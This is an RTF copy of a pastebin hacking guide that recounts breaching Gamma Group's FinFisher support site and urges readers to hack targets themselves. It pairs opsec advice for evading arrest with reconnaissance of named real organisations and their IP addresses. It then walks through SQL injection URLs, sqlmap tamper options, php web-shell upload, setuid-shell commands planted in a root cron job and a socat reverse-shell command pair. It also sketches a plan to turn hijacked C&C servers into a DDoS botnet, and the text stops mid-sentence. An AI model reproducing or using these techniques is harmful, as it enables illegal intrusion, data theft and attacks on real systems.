{\rtf1\ansi\ansicpg1252\uc1\deff0
{\fonttbl{\f0\fmodern\fcharset0\fprq2 Courier New;}{\f1\fmodern\fcharset0\fprq1 Courier New;}}
{\colortbl;\red0\green0\blue0;\red255\green255\blue255;}
\paperw12240\paperh15840\margl1800\margr1800\margt1440\margb1440\fet2\ftnbj\aenddoc
\pgnrestart\pgnstarts0
\pard\plain \keep\sb240\ltrch\loch {\f1\fs24\b0\i0 http://pastebin.com/raw.php?i=cRYvK4jb}
\par\pard\plain \sb240\ltrch\loch \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0                 _   _            _      ____             _    _ }
\par\pard\plain \keep\ltrch\loch {\f1\fs24\b0\i0                | | | | __ _  ___| | __ | __ )  __ _  ___| | _| |}
\par\plain {\f1\fs24\b0\i0                | |_| |/ _` |/ __| |/ / |  _ \\ / _` |/ __| |/ / |}
\par\plain {\f1\fs24\b0\i0                |  _  | (_| | (__|   <  | |_) | (_| | (__|   <|_|}
\par\plain {\f1\fs24\b0\i0                |_| |_|\\__,_|\\___|_|\\_\\ |____/ \\__,_|\\___|_|\\_(_)}
\par\plain {\f1\fs24\b0\i0                                                  }
\par\plain {\f1\fs24\b0\i0      A DIY Guide for those without the patience to wait for whistleblowers}
\par\plain \f1\fs24\b0\i0
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 --[ 1 ]-- Introduction}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 I'm not writing this to brag about what an 31337 h4x0r I am and what m4d sk1llz}
\par\plain {\f1\fs24\b0\i0 it took to 0wn Gamma. I'm writing this to demystify hacking, to show how simple}
\par\plain {\f1\fs24\b0\i0 it is, and to hopefully inform and inspire you to go out and hack shit. If you}
\par\plain {\f1\fs24\b0\i0 have no experience with programming or hacking, some of the text below might}
\par\plain {\f1\fs24\b0\i0 look like a foreign language. Check the resources section at the end to help you}
\par\plain {\f1\fs24\b0\i0 get started. And trust me, once you've learned the basics you'll realize this}
\par\plain {\f1\fs24\b0\i0 really is easier than filing a FOIA request.}
\par\plain \f1\fs24\b0\i0
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 --[ 2 ]-- Staying Safe}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 This is illegal, so you'll need to take same basic precautions:}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 1) Make a hidden encrypted volume with Truecrypt 7.1a [0]}
\par\plain {\f1\fs24\b0\i0 2) Inside the encrypted volume install Whonix [1]}
\par\plain {\f1\fs24\b0\i0 3) (Optional) While just having everything go over Tor thanks to Whonix is}
\par\plain {\f1\fs24\b0\i0    probably sufficient, it's better to not use an internet connection connected}
\par\plain {\f1\fs24\b0\i0    to your name or address. A cantenna, aircrack, and reaver can come in handy}
\par\plain {\f1\fs24\b0\i0    here.}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 [0] https://truecrypt.ch/downloads/}
\par\plain {\f1\fs24\b0\i0 [1] https://www.whonix.org/wiki/Download#Install_Whonix}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 As long as you follow common sense like never do anything hacking related}
\par\plain {\f1\fs24\b0\i0 outside of Whonix, never do any of your normal computer usage inside Whonix,}
\par\plain {\f1\fs24\b0\i0 never mention any information about your real life when talking with other}
\par\plain {\f1\fs24\b0\i0 hackers, and never brag about your illegal hacking exploits to friends in real}
\par\plain {\f1\fs24\b0\i0 life, then you can pretty much do whatever you want with no fear of being v&.}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 NOTE: I do NOT recommend actually hacking directly over Tor. While Tor is usable}
\par\plain {\f1\fs24\b0\i0 for some things like web browsing, when it comes to using hacking tools like}
\par\plain {\f1\fs24\b0\i0 nmap, sqlmap, and nikto that are making thousands of requests, they will run}
\par\plain {\f1\fs24\b0\i0 very slowly over Tor. Not to mention that you'll want a public IP address to}
\par\plain {\f1\fs24\b0\i0 receive connect back shells. I recommend using servers you've hacked or a VPS}
\par\plain {\f1\fs24\b0\i0 paid with bitcoin to hack from. That way only the low bandwidth text interface}
\par\plain {\f1\fs24\b0\i0 between you and the server is over Tor. All the commands you're running will}
\par\plain {\f1\fs24\b0\i0 have a nice fast connection to your target.}
\par\plain \f1\fs24\b0\i0
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 --[ 3 ]-- Mapping out the target}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 Basically I just repeatedly use fierce [0], whois lookups on IP addresses and}
\par\plain {\f1\fs24\b0\i0 domain names, and reverse whois lookups to find all IP address space and domain}
\par\plain {\f1\fs24\b0\i0 names associated with an organization.}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 [0] http://ha.ckers.org/fierce/}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 For an example let's take Blackwater. We start out knowing their homepage is at}
\par\plain {\f1\fs24\b0\i0 academi.com. Running fierce.pl -dns academi.com we find the subdomains:}
\par\plain {\f1\fs24\b0\i0 67.238.84.228   email.academi.com}
\par\plain {\f1\fs24\b0\i0 67.238.84.242   extranet.academi.com}
\par\plain {\f1\fs24\b0\i0 67.238.84.240   mail.academi.com}
\par\plain {\f1\fs24\b0\i0 67.238.84.230   secure.academi.com}
\par\plain {\f1\fs24\b0\i0 67.238.84.227   vault.academi.com}
\par\plain {\f1\fs24\b0\i0 54.243.51.249   www.academi.com}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 Now we do whois lookups and find the homepage of www.academi.com is hosted on}
\par\plain {\f1\fs24\b0\i0 Amazon Web Service, while the other IPs are in the range:}
\par\plain {\f1\fs24\b0\i0 NetRange:       67.238.84.224 - 67.238.84.255}
\par\plain {\f1\fs24\b0\i0 CIDR:           67.238.84.224/27}
\par\plain {\f1\fs24\b0\i0 CustName:       Blackwater USA}
\par\plain {\f1\fs24\b0\i0 Address:        850 Puddin Ridge Rd}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 Doing a whois lookup on academi.com reveals it's also registered to the same}
\par\plain {\f1\fs24\b0\i0 address, so we'll use that as a string to search with for the reverse whois}
\par\plain {\f1\fs24\b0\i0 lookups. As far as I know all the actual reverse whois lookup services cost}
\par\plain {\f1\fs24\b0\i0 money, so I just cheat with google:}
\par\plain {\f1\fs24\b0\i0 "850 Puddin Ridge Rd" inurl:ip-address-lookup}
\par\plain {\f1\fs24\b0\i0 "850 Puddin Ridge Rd" inurl:domaintools}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 Now run fierce.pl -range on the IP ranges you find to lookup dns names, and}
\par\plain {\f1\fs24\b0\i0 fierce.pl -dns on the domain names to find subdomains and IP addresses. Do more}
\par\plain {\f1\fs24\b0\i0 whois lookups and repeat the process until you've found everything.}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 Also just google the organization and browse around its websites. For example on}
\par\plain {\f1\fs24\b0\i0 academi.com we find links to a careers portal, an online store, and an employee}
\par\plain {\f1\fs24\b0\i0 resources page, so now we have some more:}
\par\plain {\f1\fs24\b0\i0 54.236.143.203  careers.academi.com}
\par\plain {\f1\fs24\b0\i0 67.132.195.12   academiproshop.com}
\par\plain {\f1\fs24\b0\i0 67.238.84.236   te.academi.com}
\par\plain {\f1\fs24\b0\i0 67.238.84.238   property.academi.com}
\par\plain {\f1\fs24\b0\i0 67.238.84.241   teams.academi.com}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 If you repeat the whois lookups and such you'll find academiproshop.com seems to}
\par\plain {\f1\fs24\b0\i0 not be hosted or maintained by Blackwater, so scratch that off the list of}
\par\plain {\f1\fs24\b0\i0 interesting IPs/domains.}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 In the case of FinFisher what led me to the vulnerable finsupport.finfisher.com}
\par\plain {\f1\fs24\b0\i0 was simply a whois lookup of finfisher.com which found it registered to the name}
\par\plain {\f1\fs24\b0\i0 "FinFisher GmbH". Googling for:}
\par\plain {\f1\fs24\b0\i0 "FinFisher GmbH" inurl:domaintools}
\par\plain {\f1\fs24\b0\i0 finds gamma-international.de, which redirects to finsupport.finfisher.com}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 ...so now you've got some idea how I map out a target.}
\par\plain {\f1\fs24\b0\i0 This is actually one of the most important parts, as the larger the attack}
\par\plain {\f1\fs24\b0\i0 surface that you are able to map out, the easier it will be to find a hole}
\par\plain {\f1\fs24\b0\i0 somewhere in it.}
\par\plain \f1\fs24\b0\i0
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 --[ 4 ]-- Scanning & Exploiting}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 Scan all the IP ranges you found with nmap to find all services running. Aside}
\par\plain {\f1\fs24\b0\i0 from a standard port scan, scanning for SNMP is underrated.}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 Now for each service you find running:}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 1) Is it exposing something it shouldn't? Sometimes companies will have services}
\par\plain {\f1\fs24\b0\i0 running that require no authentication and just assume it's safe because the url}
\par\plain {\f1\fs24\b0\i0 or IP to access it isn't public. Maybe fierce found a git subdomain and you can}
\par\plain {\f1\fs24\b0\i0 go to git.companyname.come/gitweb/ and browse their source code.}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 2) Is it horribly misconfigured? Maybe they have an ftp server that allows}
\par\plain {\f1\fs24\b0\i0 anonymous read or write access to an important directory. Maybe they have a}
\par\plain {\f1\fs24\b0\i0 database server with a blank admin password (lol stratfor). Maybe their embedded}
\par\plain {\f1\fs24\b0\i0 devices (VOIP boxes, IP Cameras, routers etc) are using the manufacturer's}
\par\plain {\f1\fs24\b0\i0 default password.}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 3) Is it running an old version of software vulnerable to a public exploit?}
\par\plain \f1\fs24\b0\i0
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 Webservers deserve their own category. For any webservers, including ones nmap}
\par\plain {\f1\fs24\b0\i0 will often find running on nonstandard ports, I usually:}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 1) Browse them. Especially on subdomains that fierce finds which aren't intended}
\par\plain {\f1\fs24\b0\i0 for public viewing like test.company.com or dev.company.com you'll often find}
\par\plain {\f1\fs24\b0\i0 interesting stuff just by looking at them.}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 2) Run nikto [0]. This will check for things like webserver/.svn/,}
\par\plain {\f1\fs24\b0\i0 webserver/backup/, webserver/phpinfo.php, and a few thousand other common}
\par\plain {\f1\fs24\b0\i0 mistakes and misconfigurations.}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 3) Identify what software is being used on the website. WhatWeb is useful [1]}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 4) Depending on what software the website is running, use more specific tools}
\par\plain {\f1\fs24\b0\i0 like wpscan [2], CMS-Explorer [3], and Joomscan [4].}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 First try that against all services to see if any have a misconfiguration,}
\par\plain {\f1\fs24\b0\i0 publicly known vulnerability, or other easy way in. If not, it's time to move}
\par\plain {\f1\fs24\b0\i0 on to finding a new vulnerability:}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 5) Custom coded web apps are more fertile ground for bugs than large widely used}
\par\plain {\f1\fs24\b0\i0 projects, so try those first. I use ZAP [5], and some combination of its}
\par\plain {\f1\fs24\b0\i0 automated tests along with manually poking around with the help of its}
\par\plain {\f1\fs24\b0\i0 intercepting proxy.}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 6) For the non-custom software they're running, get a copy to look at.  If it's}
\par\plain {\f1\fs24\b0\i0 free software you can just download it. If it's proprietary you can usually}
\par\plain {\f1\fs24\b0\i0 pirate it. If it's proprietary and obscure enough that you can't pirate it you}
\par\plain {\f1\fs24\b0\i0 can buy it (lame) or find other sites running the same software using google,}
\par\plain {\f1\fs24\b0\i0 find one that's easier to hack, and get a copy from them.}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 [0] http://www.cirt.net/nikto2}
\par\plain {\f1\fs24\b0\i0 [1] http://www.morningstarsecurity.com/research/whatweb}
\par\plain {\f1\fs24\b0\i0 [2] http://wpscan.org/}
\par\plain {\f1\fs24\b0\i0 [3] https://code.google.com/p/cms-explorer/}
\par\plain {\f1\fs24\b0\i0 [4] http://sourceforge.net/projects/joomscan/}
\par\plain {\f1\fs24\b0\i0 [5] https://code.google.com/p/zaproxy/}
\par\plain \f1\fs24\b0\i0
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 For finsupport.finfisher.com the process was:}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 * Start nikto running in the background.}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 * Visit the website. See nothing but a login page. Quickly check for sqli in the}
\par\plain {\f1\fs24\b0\i0   login form.}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 * See if WhatWeb knows anything about what software the site is running.}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 * WhatWeb doesn't recognize it, so the next question I want answered is if this}
\par\plain {\f1\fs24\b0\i0   is a custom website by Gamma, or if there are other websites using the same}
\par\plain {\f1\fs24\b0\i0   software.}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 * I view the page source to find a URL I can search on (index.php isn't}
\par\plain {\f1\fs24\b0\i0   exactly unique to this software). I pick Scripts/scripts.js.php, and google:}
\par\plain {\f1\fs24\b0\i0   allinurl:"Scripts/scripts.js.php"}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 * I find there's a handful of other sites using the same software, all coded by}
\par\plain {\f1\fs24\b0\i0   the same small webdesign firm. It looks like each site is custom coded but}
\par\plain {\f1\fs24\b0\i0   they share a lot of code. So I hack a couple of them to get a collection of}
\par\plain {\f1\fs24\b0\i0   code written by the webdesign firm.}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 At this point I can see the news stories that journalists will write to drum}
\par\plain {\f1\fs24\b0\i0 up views: "In a sophisticated, multi-step attack, hackers first compromised a}
\par\plain {\f1\fs24\b0\i0 web design firm in order to acquire confidential data that would aid them in}
\par\plain {\f1\fs24\b0\i0 attacking Gamma Group..."}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 But it's really quite easy, done almost on autopilot once you get the hang of}
\par\plain {\f1\fs24\b0\i0 it. It took all of a couple minutes to:}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 * google allinurl:"Scripts/scripts.js.php" and find the other sites}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 * Notice they're all sql injectable in the first url parameter I try.}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 * Realize they're running Apache ModSecurity so I need to use sqlmap [0] with}
\par\plain {\f1\fs24\b0\i0   the option --tamper='tamper/modsecurityversioned.py'}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 * Acquire the admin login information, login and upload a php shell [1] (the}
\par\plain {\f1\fs24\b0\i0   check for allowable file extensions was done client side in javascript), and}
\par\plain {\f1\fs24\b0\i0   download the website's source code.}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 [0] http://sqlmap.org/}
\par\plain {\f1\fs24\b0\i0 [1] https://epinna.github.io/Weevely/}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 Looking through the source code they might as well have named it Damn Vulnerable}
\par\plain {\f1\fs24\b0\i0 Web App v2 [0]. It's got sqli, LFI, file upload checks done client side in}
\par\plain {\f1\fs24\b0\i0 javascript, and if you're unauthenticated the admin page just sends you back to}
\par\plain {\f1\fs24\b0\i0 the login page with a Location header, but you can have your intercepting proxy}
\par\plain {\f1\fs24\b0\i0 filter the Location header out and access it just fine.}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 [0] http://www.dvwa.co.uk/}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 Heading back over to the finsupport site, the admin /BackOffice/ page returns}
\par\plain {\f1\fs24\b0\i0 403 Forbidden, and I'm having some issues with the LFI, so I switch to using the}
\par\plain {\f1\fs24\b0\i0 sqli (it's nice to have a dozen options to choose from). The other sites by the}
\par\plain {\f1\fs24\b0\i0 web designer all had an injectable print.php, so some quick requests to:}
\par\plain {\f1\fs24\b0\i0 https://finsupport.finfisher.com/GGI/Home/print.php?id=1 and 1=1}
\par\plain {\f1\fs24\b0\i0 https://finsupport.finfisher.com/GGI/Home/print.php?id=1 and 2=1}
\par\plain {\f1\fs24\b0\i0 reveal that finsupport also has print.php and it is injectable. And it's}
\par\plain {\f1\fs24\b0\i0 database admin! For MySQL this means you can read and write files. It turns out}
\par\plain {\f1\fs24\b0\i0 the site has magicquotes enabled, so I can't use INTO OUTFILE to write files.}
\par\plain {\f1\fs24\b0\i0 But I can use a short script that uses sqlmap --file-read to get the php source}
\par\plain {\f1\fs24\b0\i0 for a URL, and a normal web request to get the HTML, and then finds files}
\par\plain {\f1\fs24\b0\i0 included or required in the php source, and finds php files linked in the HTML,}
\par\plain {\f1\fs24\b0\i0 to recursively download the source to the whole site.}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 Looking through the source, I see customers can attach a file to their support}
\par\plain {\f1\fs24\b0\i0 tickets, and there's no check on the file extension. So I pick a username and}
\par\plain {\f1\fs24\b0\i0 password out of the customer database, create a support request with a php shell}
\par\plain {\f1\fs24\b0\i0 attached, and I'm in!}
\par\plain \f1\fs24\b0\i0
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 --[ 5 ]-- (fail at) Escalating}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0  ___________ }
\par\plain {\f1\fs24\b0\i0 < got r00t? >}
\par\plain {\f1\fs24\b0\i0  ----------- }
\par\plain {\f1\fs24\b0\i0         \\   ^__^}
\par\plain {\f1\fs24\b0\i0          \\  (oo)\\_______}
\par\plain {\f1\fs24\b0\i0             (__)\\       )\\/\\}
\par\plain {\f1\fs24\b0\i0                 ||----w |}
\par\plain {\f1\fs24\b0\i0                 ||     ||}
\par\plain {\f1\fs24\b0\i0             ^^^^^^^^^^^^^^^^}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 Root over 50% of linux servers you encounter in the wild with two easy scripts,}
\par\plain {\f1\fs24\b0\i0 Linux_Exploit_Suggester [0], and unix-privesc-check [1].}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 [0] https://github.com/PenturaLabs/Linux_Exploit_Suggester}
\par\plain {\f1\fs24\b0\i0 [1] https://code.google.com/p/unix-privesc-check/}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 finsupport was running the latest version of Debian with no local root exploits,}
\par\plain {\f1\fs24\b0\i0 but unix-privesc-check returned:}
\par\plain {\f1\fs24\b0\i0 WARNING: /etc/cron.hourly/mgmtlicensestatus is run by cron as root. The user}
\par\plain {\f1\fs24\b0\i0 www-data can write to /etc/cron.hourly/mgmtlicensestatus}
\par\plain {\f1\fs24\b0\i0 WARNING: /etc/cron.hourly/webalizer is run by cron as root. The user www-data}
\par\plain {\f1\fs24\b0\i0 can write to /etc/cron.hourly/webalizer}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 so I add to /etc/cron.hourly/webalizer:}
\par\plain {\f1\fs24\b0\i0 chown root:root /path/to/my_setuid_shell}
\par\plain {\f1\fs24\b0\i0 chmod 04755 /path/to/my_setuid_shell}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 wait an hour, and ....nothing. Turns out that while the cron process is running}
\par\plain {\f1\fs24\b0\i0 it doesn't seem to be actually running cron jobs. Looking in the webalizer}
\par\plain {\f1\fs24\b0\i0 directory shows it didn't update stats the previous month. Apparently after}
\par\plain {\f1\fs24\b0\i0 updating the timezone cron will sometimes run at the wrong time or sometimes not}
\par\plain {\f1\fs24\b0\i0 run at all and you need to restart cron after changing the timezone. ls -l}
\par\plain {\f1\fs24\b0\i0 /etc/localtime shows the timezone got updated June 6, the same time webalizer}
\par\plain {\f1\fs24\b0\i0 stopped recording stats, so that's probably the issue. At any rate, the only}
\par\plain {\f1\fs24\b0\i0 thing this server does is host the website, so I already have access to}
\par\plain {\f1\fs24\b0\i0 everything interesting on it. Root wouldn't get much of anything new, so I move}
\par\plain {\f1\fs24\b0\i0 on to the rest of the network.}
\par\plain \f1\fs24\b0\i0
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 --[ 6 ]-- Pivoting}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 The next step is to look around the local network of the box you hacked.  This}
\par\plain {\f1\fs24\b0\i0 is pretty much the same as the first Scanning & Exploiting step, except that}
\par\plain {\f1\fs24\b0\i0 from behind the firewall many more interesting services will be exposed. A}
\par\plain {\f1\fs24\b0\i0 tarball containing a statically linked copy of nmap and all its scripts that you}
\par\plain {\f1\fs24\b0\i0 can upload and run on any box is very useful for this. The various nfs-* and}
\par\plain {\f1\fs24\b0\i0 especially smb-* scripts nmap has will be extremely useful.}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 The only interesting thing I could get on finsupport's local network was another}
\par\plain {\f1\fs24\b0\i0 webserver serving up a folder called 'qateam' containing their mobile malware.}
\par\plain \f1\fs24\b0\i0
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 --[ 7 ]-- Have Fun}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 Once you're in their networks, the real fun starts. Just use your imagination.}
\par\plain {\f1\fs24\b0\i0 While I titled this a guide for wannabe whistleblowers, there's no reason to}
\par\plain {\f1\fs24\b0\i0 limit yourself to leaking documents. My original plan was to:}
\par\plain {\f1\fs24\b0\i0 1) Hack Gamma and obtain a copy of the FinSpy server software}
\par\plain {\f1\fs24\b0\i0 2) Find vulnerabilities in FinSpy server.}
\par\plain {\f1\fs24\b0\i0 3) Scan the internet for, and hack, all FinSpy C&C servers.}
\par\plain {\f1\fs24\b0\i0 4) Identify the groups running them.}
\par\plain {\f1\fs24\b0\i0 5) Use the C&C server to upload and run a program on all targets telling them}
\par\plain {\f1\fs24\b0\i0    who was spying on them.}
\par\plain {\f1\fs24\b0\i0 6) Use the C&C server to uninstall FinFisher on all targets.}
\par\plain {\f1\fs24\b0\i0 7) Join the former C&C servers into a botnet to DDoS Gamma Group.}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 It was only after failing to fully hack Gamma and ending up with some}
\par\plain {\f1\fs24\b0\i0 interesting documents but no copy of the FinSpy server software that I had to}
\par\plain {\f1\fs24\b0\i0 make due with the far less lulzy backup plan of leaking their stuff while}
\par\plain {\f1\fs24\b0\i0 mocking them on twitter.}
\par\plain {\f1\fs24\b0\i0 Point your GPUs at FinSpy-PC+Mobile-2012-07-12-Final.zip and crack the password}
\par\plain {\f1\fs24\b0\i0 already so I can move on to step 2!}
\par\plain \f1\fs24\b0\i0
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 --[ 8 ]-- Other Methods}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 The general method I outlined above of scan, find vulnerabilities, and exploit}
\par\plain {\f1\fs24\b0\i0 is just one way to hack, probably better suited to those with a background in}
\par\plain {\f1\fs24\b0\i0 programming. There's no one right way, and any method that works is as good as}
\par\plain {\f1\fs24\b0\i0 any other. The other main ways that I'll state without going into detail are:}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 1) Exploits in web browers, java, flash, or microsoft office, combined with}
\par\plain {\f1\fs24\b0\i0 emailing employees with a convincing message to get them to open the link or}
\par\plain {\f1\fs24\b0\i0 attachment, or hacking a web site frequented by the employees and adding the}
\par\plain {\f1\fs24\b0\i0 browser/java/flash exploit to that.}
\par\plain {\f1\fs24\b0\i0 This is the method used by most of the government hacking groups, but you don't}
\par\plain {\f1\fs24\b0\i0 need to be a government with millions to spend on 0day research or subscriptions}
\par\plain {\f1\fs24\b0\i0 to FinSploit or VUPEN to pull it off. You can get a quality russian exploit kit}
\par\plain {\f1\fs24\b0\i0 for a couple thousand, and rent access to one for much less. There's also}
\par\plain {\f1\fs24\b0\i0 metasploit browser autopwn, but you'll probably have better luck with no}
\par\plain {\f1\fs24\b0\i0 exploits and a fake flash updater prompt.}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 2) Taking advantage of the fact that people are nice, trusting, and helpful 95%}
\par\plain {\f1\fs24\b0\i0 of the time.}
\par\plain {\f1\fs24\b0\i0 The infosec industry invented a term to make this sound like some sort of}
\par\plain {\f1\fs24\b0\i0 science: "Social Engineering". This is probably the way to go if you don't know}
\par\plain {\f1\fs24\b0\i0 too much about computers, and it really is all it takes to be a successful}
\par\plain {\f1\fs24\b0\i0 hacker [0].}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 [0] https://www.youtube.com/watch?v=DB6ywr9fngU}
\par\plain \f1\fs24\b0\i0
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 --[ 9 ]-- Resources}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 Links:}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 * https://www.pentesterlab.com/exercises/}
\par\plain {\f1\fs24\b0\i0 * http://overthewire.org/wargames/}
\par\plain {\f1\fs24\b0\i0 * http://www.hackthissite.org/}
\par\plain {\f1\fs24\b0\i0 * http://smashthestack.org/}
\par\plain {\f1\fs24\b0\i0 * http://www.win.tue.nl/~aeb/linux/hh/hh.html}
\par\plain {\f1\fs24\b0\i0 * http://www.phrack.com/}
\par\plain {\f1\fs24\b0\i0 * http://pen-testing.sans.org/blog/2012/04/26/got-meterpreter-pivot}
\par\plain {\f1\fs24\b0\i0 * http://www.offensive-security.com/metasploit-unleashed/PSExec_Pass_The_Hash}
\par\plain {\f1\fs24\b0\i0 * https://securusglobal.com/community/2013/12/20/dumping-windows-credentials/}
\par\plain {\f1\fs24\b0\i0 * https://www.netspi.com/blog/entryid/140/resources-for-aspiring-penetration-testers}
\par\plain {\f1\fs24\b0\i0   (all his other blog posts are great too)}
\par\plain {\f1\fs24\b0\i0 * https://www.corelan.be/ (start at Exploit writing tutorial part 1)}
\par\plain {\f1\fs24\b0\i0 * http://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/}
\par\plain {\f1\fs24\b0\i0   One trick it leaves out is that on most systems the apache access log is}
\par\plain {\f1\fs24\b0\i0   readable only by root, but you can still include from /proc/self/fd/10 or}
\par\plain {\f1\fs24\b0\i0   whatever fd apache opened it as. It would also be more useful if it mentioned}
\par\plain {\f1\fs24\b0\i0   what versions of php the various tricks were fixed in.}
\par\plain {\f1\fs24\b0\i0 * http://www.dest-unreach.org/socat/}
\par\plain {\f1\fs24\b0\i0   Get usable reverse shells with a statically linked copy of socat to drop on}
\par\plain {\f1\fs24\b0\i0   your target and:}
\par\plain {\f1\fs24\b0\i0   target$ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp-listen:PORTNUM}
\par\plain {\f1\fs24\b0\i0   host$ socat file:`tty`,raw,echo=0 tcp-connect:localhost:PORTNUM}
\par\plain {\f1\fs24\b0\i0   It's also useful for setting up weird pivots and all kinds of other stuff.}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 Books:}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 * The Web Application Hacker's Handbook}
\par\plain {\f1\fs24\b0\i0 * Hacking: The Art of Exploitation}
\par\plain {\f1\fs24\b0\i0 * The Database Hacker's Handbook}
\par\plain {\f1\fs24\b0\i0 * The Art of Software Security Assessment}
\par\plain {\f1\fs24\b0\i0 * A Bug Hunter's Diary}
\par\plain {\f1\fs24\b0\i0 * Underground: Tales of Hacking, Madness, and Obsession on the Electronic Frontier}
\par\plain {\f1\fs24\b0\i0 * TCP/IP Illustrated}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 Aside from the hacking specific stuff almost anything useful to a system}
\par\plain {\f1\fs24\b0\i0 administrator for setting up and administering networks will also be useful for}
\par\plain {\f1\fs24\b0\i0 exploring them. This includes familiarity with the windows command prompt and unix}
\par\plain {\f1\fs24\b0\i0 shell, basic scripting skills, knowledge of ldap, kerberos, active directory,}
\par\plain {\f1\fs24\b0\i0 networking, etc.}
\par\plain \f1\fs24\b0\i0
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 --[ 10 ]-- Outro}
\par\plain \f1\fs24\b0\i0
\par\plain {\f1\fs24\b0\i0 You'll notice some of this sounds exactly like what Gamma is doing. Hacking is a}
\par\plain {\f1\fs24\b0\i0 tool. It's not selling hacking tools that makes Gamma evil. It's who their}
